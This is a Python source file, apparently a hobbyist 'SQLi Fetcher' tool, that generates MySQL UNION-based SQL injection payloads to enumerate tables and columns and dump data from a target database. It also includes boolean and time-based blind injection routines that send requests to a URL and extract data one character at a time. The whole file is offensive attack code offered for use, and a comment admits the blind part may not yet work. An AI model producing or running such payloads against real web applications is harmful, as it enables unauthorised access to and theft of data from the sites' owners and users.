import requests
import sys
import string
import random
import os

def banner():
    text = '''
███████╗ ██████╗ ██╗     ██╗    ███████╗███████╗████████╗██╗  ██╗ ██████╗███████╗██████╗ 
██╔════╝██╔═══██╗██║     ██║    ██╔════╝██╔════╝╚══██╔══╝██║  ██║██╔════╝██╔════╝██╔══██╗
███████╗██║   ██║██║     ██║    █████╗  █████╗     ██║   ███████║██║     █████╗  ██████╔╝
╚════██║██║▄▄ ██║██║     ██║    ██╔══╝  ██╔══╝     ██║   ██╔══██║██║     ██╔══╝  ██╔══██╗
███████║╚██████╔╝███████╗██║    ██║     ███████╗   ██║   ██║  ██║╚██████╗███████╗██║  ██║
╚══════╝ ╚══▀▀═╝ ╚══════╝╚═╝    ╚═╝     ╚══════╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚══════╝╚═╝  ╚═╝
                                                                                         '''
    
    print(text)
    print("made by: DJumanto")
    print("We make your payload so you dont have to make one by yourself")


def menu():
    print("\n\nUsage: python3 sqli_fetcher.py <your payload> <options>")
    print("-m <method> : method to use")
    print("Methods available: ")
    print("\ttables")
    print("\tcolumns")
    print("\tdata")
    print("-c <column count> : number of columns to return")
    print("-t <table> : table to return")
    print("-b <blind status> : blind mode (0 default for no, 1 for yes)")
    print("-k <keystring> : keystring")
    print("-s <substitution> : character substitution (comma separated)")
    print("-d <dbcontext> : database context (default mysql)")

def generate_random_string():
    return ''.join(random.choices(string.ascii_lowercase + string.ascii_uppercase, k=10))

# Return information in bound with returned response
def return_tables(payload, colcount, keystring=generate_random_string(), sub=[], dbcontext="mysql"):
    sqlpayload = f'''{payload} UNION SELECT table_name,{f"'{keystring}',"*colcount} FROM information_schema.tables WHERE table_schema=database()-- -'''.replace(f"'{keystring}', FROM", f"'{keystring}' FROM")
    if sub != []:
        for i in range(0,len(sub),2):
            sqlpayload = sqlpayload.replace(sub[i], sub[i+1])
    return "Here's your payload sir: "+sqlpayload
def return_columns(payload, table, colcount, keystring=generate_random_string(), sub=[], dbcontext="mysql"):
    sqlpayload = f'''{payload} UNION SELECT column_name,{f"'{keystring}',"*colcount} FROM information_schema.columns WHERE table_name='{table}'-- -'''.replace(f"'{keystring}', FROM", f"'{keystring}' FROM")
    if sub != []:
        for i in range(0,len(sub),2):
            sqlpayload = sqlpayload.replace(sub[i], sub[i+1])
    return "Here's your payload sir: "+sqlpayload
def return_data(payload, table, column, colcount, keystring=generate_random_string(), sub=[], dbcontext="mysql"):
    sqlpayload = f'''{payload} UNION SELECT {column},{f"'{keystring}',"*colcount} FROM {table}-- -'''.replace(f"'{keystring}', FROM", f"'{keystring}' FROM")
    if sub != []:
        for i in range(0,len(sub),2):
            sqlpayload = sqlpayload.replace(sub[i], sub[i+1])
    return "Here's your payload sir: "+sqlpayload

# return information in bound with limited/no response
# TODO: MAKE BLIND CODE FOR USER
# TODO: MAKE IT WORK AHAHAH
def return_tables_blind(url, payload, tablenamelike,  mode='bool',dbcontext="mysql"):
    if(mode == 'bool'):
        i=1
        while True:
            sqlpayload = f'''{payload} AND IF((SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_schema=database() AND table_name LIKE '%{tablenamelike}%')>{i},1,0)-- -'''
            response = requests.get(url+sqlpayload)
            if response.status_code == 200:
                i+=1
            else:
                break
        tablename = ''
        for j in range(i):
            for s in string.ascii_lowercase:
                sqlpayload = f'''{payload} AND IF(SUBSTRING((SELECT table_name FROM information_schema.tables where table_name like '%{tablenamelike}%'), {j}, 1)={s},1,0)-- -'''
                response = requests.get(url+sqlpayload)
                if response.status_code == 200:
                    tablename += s
                    break
        return tablename
    if(mode == 'time'):
        i=1
        while True:
            sqlpayload = f'''{payload} AND IF((SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_schema=database() AND table_name LIKE '%{tablenamelike}%')>{i},SLEEP(4),0)-- -'''
            response = requests.get(url+sqlpayload)
            if response.elapsed.total_seconds() > 3:
                i+=1
            else:
                break
        tablename = ''
        for j in range(i):
            for s in string.ascii_lowercase:
                sqlpayload = f'''{payload} AND IF(SUBSTRING((SELECT table_name FROM information_schema.tables where table_name like '%{tablenamelike}%'), {j}, 1)={s},SLEEP(4),0)-- -'''
                response = requests.get(url+sqlpayload)
                if response.elapsed.total_seconds() > 3:
                    tablename += s
                    break
        return tablename

    
    return
def return_columns_blind(url, payload, table, mode="bool", dbcontext="mysql"):
    if(mode == 'bool'):
        i=1
        while True:
            sqlpayload = f'''{payload} AND IF((SELECT LENGTH(GROUP_CONCAT(column_name)) FROM information_schema.columns WHERE table_name='{table}')>{i},1,0)-- -'''
            response = requests.get(url+sqlpayload)
            if response.status_code == 200:
                i+=1
            else:
                break
        columnname = ''
        for j in range(i):
            for s in 'abcdefghijklmnopqrstuvxyz0123456789, ':
                sqlpayload = f'''{payload} AND IF(SUBSTRING((SELECT GROUP_CONCAT(column_name) FROM information_schema.columns where table_name='{table}'), {j}, 1)={s},1,0)-- -'''
                response = requests.get(url+sqlpayload)
                if response.status_code == 200:
                    columnname += s
                    break
        return columnname
    if(mode == 'time'):
        i=1
        while True:
            sqlpayload = f'''{payload} AND IF((SELECT LENGTH(GROUP_CONCAT(column_name)) FROM information_schema.columns WHERE table_name='{table}')>{i},SLEEP(4),0)-- -'''
            response = requests.get(url+sqlpayload)
            if response.elapsed.total_seconds() > 3:
                i+=1
            else:
                break
        columnname = ''
        for j in range(i):
            for s in 'abcdefghijklmnopqrstuvxyz0123456789, ':
                sqlpayload = f'''{payload} AND IF(SUBSTRING((SELECT GROUP_CONCAT(column_name) FROM information_schema.columns where table_name='{table}'), {j}, 1)={s},SLEEP(4),0)-- -'''
                response = requests.get(url+sqlpayload)
                if response.elapsed.total_seconds() > 3:
                    columnname += s
                    break
        return columnname

    return
def return_data_blind(url, payload, table, column, mode="bool", dbcontext="mysql"):
    if(mode == 'bool'):
        i=1
        while True:
            sqlpayload = f'''{payload} AND IF((SELECT LENGTH(GROUP_CONCAT({column})) FROM {table})>{i},1,0)-- -'''
            response = requests.get(url+sqlpayload)
            if response.status_code == 200:
                i+=1
            else:
                break
        data = ''
        for j in range(i):
            for s in 'abcdefghijklmnopqrstuvxyz0123456789, ':
                sqlpayload = f'''{payload} AND IF(SUBSTRING((SELECT GROUP_CONCAT({column}) FROM {table}), {j}, 1)={s},1,0)-- -'''
                response = requests.get(url+sqlpayload)
                if response.status_code == 200:
                    data += s
                    break
        return data
    if(mode == 'time'):
        i=1
        while True:
            sqlpayload = f'''{payload} AND IF((SELECT LENGTH(GROUP_CONCAT({column})) FROM {table})>{i},SLEEP(4),0)-- -'''
            response = requests.get(url+sqlpayload)
            if response.elapsed.total_seconds() > 3:
                i+=1
            else:
                break
        data = ''
        for j in range(i):
            for s in 'abcdefghijklmnopqrstuvxyz0123456789, ':
                sqlpayload = f'''{payload} AND IF(SUBSTRING((SELECT GROUP_CONCAT({column}) FROM {table}), {j}, 1)={s},SLEEP(4),0)-- -'''
                response = requests.get(url+sqlpayload)
                if response.elapsed.total_seconds() > 3:
                    data += s
                    break
        return data
    return

if __name__ == '__main__':
    banner()
    menu()


